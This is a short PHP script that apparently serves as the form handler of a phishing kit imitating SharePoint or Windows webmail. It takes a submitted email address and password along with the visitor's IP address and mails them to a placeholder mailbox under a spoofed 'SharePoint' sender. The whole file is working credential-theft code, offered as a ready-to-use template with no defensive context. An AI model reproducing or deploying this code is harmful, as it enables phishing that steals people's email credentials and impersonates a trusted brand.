<?
$ip = getenv("REMOTE_ADDR");
$x1 = $_POST['x1'];
$x2 = $_POST['x2'];
$msg = "Email ID: $x1\nEmail Password: $x2\nIp: $ip";
$from = "From: SharePoint<info@sharing.com>";
$subj = "windows webmail";
mail("put your email here",$subj,$msg,$from);
?>